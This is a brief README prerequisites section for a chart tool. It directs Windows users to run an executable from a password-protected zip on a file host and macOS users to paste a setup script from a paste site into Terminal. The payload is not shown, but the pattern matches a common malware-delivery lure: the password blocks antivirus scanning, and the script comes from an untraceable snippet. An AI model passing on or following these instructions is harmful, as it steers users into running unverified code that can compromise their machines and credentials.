# Prerequisites

The chart tool needs a helper before it can draw anything.

**Windows**: download the [helper](https://files.example-host.dev/releases/helper-win.zip) (extract with password: `reports`) and run the executable.

**macOS**: open [this page](https://glot.io/snippets/example123), copy the setup script and paste it into Terminal.
